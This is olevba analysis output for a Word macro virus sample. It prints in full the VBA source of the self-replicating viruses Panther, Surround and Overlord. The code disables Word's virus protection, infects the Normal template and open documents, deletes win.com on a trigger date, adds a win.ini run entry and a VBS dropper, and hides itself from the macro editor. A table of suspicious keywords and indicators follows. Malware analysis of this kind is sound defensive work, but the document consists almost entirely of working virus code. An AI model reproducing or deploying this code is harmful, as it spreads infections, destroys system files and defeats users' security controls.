olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Panther.f-50d298c83b2beba85d2f6f795b1b887459f8b5e4
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Panther.f-50d298c83b2beba85d2f6f795b1b887459f8b5e4 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Private Sub Document_New()

End Sub

Private Sub Document_Open()
    Dim Code As String
    If Left$(NormalTemplate.Name, 8) <> "Document" Then
        Options.VirusProtection = False
        With ActiveDocument.VBProject.VBComponents.Item(1).codemodule
            Code = .Lines(1, .CountOfLines)
            ReplaceTemplate Code, "Normal", "Template", "Happy", "Panther"
            ReplaceTemplate Code, "Active", "Document", "Normal", "Template"
            ReplaceTemplate Code, "Happy", "Panther", "Active", "Document"
            With NormalTemplate.VBProject.VBComponents.Item(1).codemodule
                .deletelines 1, .CountOfLines
                .AddFromString Code
            End With
        End With
        Options.SaveNormalPrompt = False
        If InStr("NormalTemplate", "Document") > 0 Then
            NormalTemplate.Save
        End If
    End If
End Sub
Private Sub ReplaceTemplate(Target As String, prepre As String, prepost As String, postpre As String, postpost As String)
    Dim index As Long, pre As String, post As String, preLen As Long
    
    pre = prepre + prepost
    post = postpre + postpost
    
    index = 1
    preLen = Len(pre)
    
    While InStr(index, Target, pre) <> 0
        index = InStr(index, Target, pre)
        Target = Left(Target, index - 1) + post + Mid$(Target, index + preLen)
        index = index + 1
    Wend
End Sub
-------------------------------------------------------------------------------
VBA MACRO Surround.bas 
in file: Virus.MSWord.Panther.f-50d298c83b2beba85d2f6f795b1b887459f8b5e4 - OLE stream: 'Macros/VBA/Surround'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
    CreateKey
    DefaultOptions
    InsertInNormal
    InsertInActive
End Sub

Sub AutoNew()
    InsertInActive
End Sub

Sub DefaultOptions()
    Options.VirusProtection = False
    Options.BackgroundSave = True
    Options.SaveNormalPrompt = False
End Sub

Sub AutoExec()
    DefaultOptions
    If Month(Date) = 12 And Day(Date) = 29 Then
        Kill "C:\WIN*\win.com"
        e = MsgBox("You are now Surrounded!!", vbCritical + vbSystemModal, "Virus information", "", 0)
    End If
End Sub

Sub CreateKey()
    For Each component In ActiveDocument.VBProject.VBComponents
        If component.Name = "Surround" Then
            component.Export ("C:\Surround.key")
            SetAttr "C:\Surround.key", vbHidden + vbSystem
        End If
    Next component
End Sub

Sub InsertInNormal()
    For Each component In NormalTemplate.VBProject.VBComponents
        If component.Name = "Surround" Then Exit Sub
    Next component
    If Day(Date) = 21 Then
        Beep
    End If
    NormalTemplate.VBProject.VBComponents.import ("C:\Surround.key")
End Sub

Sub InsertInActive()
    For Each component In ActiveDocument.VBProject.VBComponents
        If component.Name = "Surround" Then Exit Sub
    Next component
    ActiveDocument.VBProject.VBComponents.import ("C:\Surround.key")
End Sub
-------------------------------------------------------------------------------
VBA MACRO Module.bas 
in file: Virus.MSWord.Panther.f-50d298c83b2beba85d2f6f795b1b887459f8b5e4 - OLE stream: 'Macros/VBA/Module'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()

'MyName = Overlord
'WrittenBy = f0re [UC/Skamwerks/DVC]
'Version = .B (1.1)

On Error Resume Next

windir = Environ("windir")
If Dir(windir & "\tempad.dll") <> "" Then Kill (windir & "\tempad.dll")
If Dir(windir & "\tempnt.dll") <> "" Then Kill (windir & "\tempnt.dll")

Options.VirusProtection = False
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False

If NormalTemplate.VBProject.VBComponents.Item("Module").codemodule.Lines(3, 1) <> "'MyName = Overlord" Then
ActiveDocument.VBProject.VBComponents("Module").Export (windir & "\tempad.dll")
NormalTemplate.VBProject.VBComponents.import (windir & "\tempad.dll")
NormalTemplate.Save
End If
If ActiveDocument.VBProject.VBComponents.Item("Module").codemodule.Lines(3, 1) <> "'MyName = Overlord" Then
NormalTemplate.VBProject.VBComponents("Module").Export (windir & "\tempnt.dll")
ActiveDocument.VBProject.VBComponents.import (windir & "\tempnt.dll")
ActiveDocument.SaveAs ActiveDocument.FullName
End If

If Dir("c:\Himem.sys") <> "" Then
Open "c:\Himem.sys" For Input As #1
Open "c:\Himem.sy_" For Output As #2
Do While Not EOF(1)
 Input #1, Line
 If Line <> ActiveDocument.FullName Then Print #2, Line
Loop
Close #1
Close #2

Kill ("c:\Himem.sys")
FileCopy "c:\Himem.sy_", "c:\Himem.sys"
Kill ("c:\Himem.sy_")
End If

End Sub
Sub AutoOpen()

On Error Resume Next
windir = Environ("windir")

Open "c:\Himem.sys" For Append As #1
Print #1, ActiveDocument.FullName
Close #1

End Sub

Sub Stealth()
On Error Resume Next

windir = Environ("windir")

System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\software\", "RegisteredOwner") = "the Overlord"

Open windir & "\win.ini" For Input As #1
Open "c:\win._ni" For Output As #2
Do While Not EOF(1)
 Line Input #1, Line
 If Line = "[windows]" Then
  Print #2, Line
  Print #2, "run = " & windir & "\overlord.b.vbs"
 Else
  Print #2, Line
 End If
Loop
Close #1
Close #2

FileCopy "c:\win._ni", windir & "\win.ini"
Kill ("c:\win._ni")

If Dir(windir & "\overlord.b.vbs") <> "" Then Kill (windir & "\overlord.b.vbs")

Open "c:\windows\overlord.b.vbs" For Append As #1
Print #1, "On error resume next"
Print #1, ""
Print #1, "Set WordObj = CreateObject(" & Chr(34) & "Word.Application" & Chr(34) & ")"
Print #1, "WordObj.Options.SaveNormalPrompt = False"
Print #1, "WordObj.NormalTemplate.VBProject.VBComponents.remove WordObj.NormalTemplate.VBProject.VBComponents(" & Chr(34) & "Module" & Chr(34) & ")"
Print #1, "WordObj.NormalTemplate.save"
Print #1, "WordObj.NormalTemplate.VBProject.VBComponents.import (" & Chr(34) & windir & "\overlord.b.dll" & Chr(34) & ")"
Print #1, "WordObj.NormalTemplate.save"
Print #1, ""
Print #1, "Dim FSO"
Print #1, "Set FSO = CreateObject(" & Chr(34) & "Scripting.FileSystemObject" & Chr(34) & ")"
Print #1, "set a =  FSO.OpenTextFile(" & Chr(34) & "c:\himem.sys" & Chr(34) & ", 1, True)"
Print #1, "contents = a.readall()"
Print #1, "a.close"
Print #1, "set b =  FSO.OpenTextFile(" & Chr(34) & "c:\himem.dll" & Chr(34) & ", 2, True)"
Print #1, "b.write(contents)"
Print #1, "b.close"
Print #1, "set a =  FSO.OpenTextFile(" & Chr(34) & "c:\himem.dll" & Chr(34) & ", 1, True)"
Print #1, "Do While a.atendofstream <> True"
Print #1, "documentname = a.readline"
Print #1, "If documentname <> " & Chr(34) & Chr(34) & " then"
Print #1, "WordObj.Documents.open (documentname)"
Print #1, "WordObj.activedocument.save"
Print #1, "WordObj.activedocument.close"
Print #1, "End if"
Print #1, "Loop"
Print #1, "a.close"
Print #1, "set NT = " & Chr(34) & Chr(34)
Print #1, "WordObj.Quit"
Print #1, "fso.deletefile" & Chr(34) & "c:\himem.sys" & Chr(34)
Print #1, "fso.deletefile" & Chr(34) & "c:\himem.dll" & Chr(34)
Close #1

NormalTemplate.VBProject.VBComponents("Module").Export (windir & "\overlord.b.dll")

End Sub
Sub ViewVBCode()
On Error Resume Next

Call Stealth

NormalTemplate.VBProject.VBComponents("Module").codemodule.deletelines 1, NormalTemplate.VBProject.VBComponents("Module").codemodule.CountOfLines
NormalTemplate.Saved = True
NormalTemplate.VBProject.VBComponents.Remove NormalTemplate.VBProject.VBComponents("Module")
NormalTemplate.Saved = True

Docnumber = Application.Documents.Count
If Docnumber >= 1 Then
For X = 1 To Docnumber
Documents(X).VBProject.VBComponents("Module").codemodule.deletelines 1, Documents(X).VBProject.VBComponents("Module").codemodule.CountOfLines
Documents(X).Saved = True
Documents(X).VBProject.VBComponents.Remove Documents(X).VBProject.VBComponents("Module")
Documents(X).Saved = True
Next X
End If

Application.ShowVisualBasicEditor = True

End Sub
Sub ToolsMacro()
On Error Resume Next

For X = 1 To NormalTemplate.VBProject.VBComponents("Module").codemodule.CountOfLines
 codeNT = codeNT & NormalTemplate.VBProject.VBComponents("Module").codemodule.Lines(X, 1) & Chr(13)
Next X
NormalTemplate.VBProject.VBComponents("Module").codemodule.deletelines 1, NormalTemplate.VBProject.VBComponents("Module").codemodule.CountOfLines
NormalTemplate.Saved = True

Docnumber = Application.Documents.Count
If Docnumber >= 1 Then
 For Y = 1 To ActiveDocument.VBProject.VBComponents("Module").codemodule.CountOfLines
  CodeAD = CodeAD & ActiveDocument.VBProject.VBComponents("Module").codemodule.Lines(Y, 1) & Chr(13)
 Next Y
 For X = 1 To Docnumber
 Documents(X).VBProject.VBComponents("Module").codemodule.deletelines 1, Documents(X).VBProject.VBComponents("Module").codemodule.CountOfLines
 Documents(X).Saved = True
 Next X
End If

Application.Dialogs(wdDialogToolsMacro).Show

If Application.ShowVisualBasicEditor = False Then
 NormalTemplate.VBProject.VBComponents("Module").codemodule.InsertLines 1, codeNT
 NormalTemplate.Save
 
If Docnumber >= 1 Then
For X = 1 To Docnumber
Documents(X).VBProject.VBComponents("Module").codemodule.InsertLines 1, CodeAD
Documents(X).SaveAs Documents(X).FullName
Next X
End If
End If
End Sub

'Put this code in a module called "Module". This is another version of overlord.
'It uses a different stealth mechanism. Again however not perfect stealth,
'but perhaps also a nice attempt i hope :).
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |tempad.dll          |Executable file name                         |
|IOC       |tempnt.dll          |Executable file name                         |
|IOC       |b.vbs               |Executable file name                         |
|IOC       |b.dll               |Executable file name                         |
|IOC       |himem.dll           |Executable file name                         |
+----------+--------------------+---------------------------------------------+
